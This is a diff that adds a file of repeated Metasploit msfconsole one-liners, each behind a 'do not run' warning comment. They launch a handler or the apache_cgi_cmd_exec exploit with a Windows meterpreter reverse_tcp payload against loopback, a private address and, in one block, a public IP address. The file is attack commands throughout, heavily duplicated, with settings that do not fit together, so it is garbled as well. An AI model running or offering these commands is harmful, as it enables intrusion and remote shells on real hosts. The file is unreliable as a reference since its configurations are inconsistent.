@@ -1,0 +1,270 @@
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 93.184.215.14; set RPORT 443; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 127.0.0.1; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/handler; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
+# MANUAL REVIEW REQUIRED - DO NOT RUN UNBLINDLY
+msfconsole -q -x "use exploit/multi/http/apache_cgi_cmd_exec; set RHOSTS 192.168.1.10; set RPORT 80; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; run; exit"
+
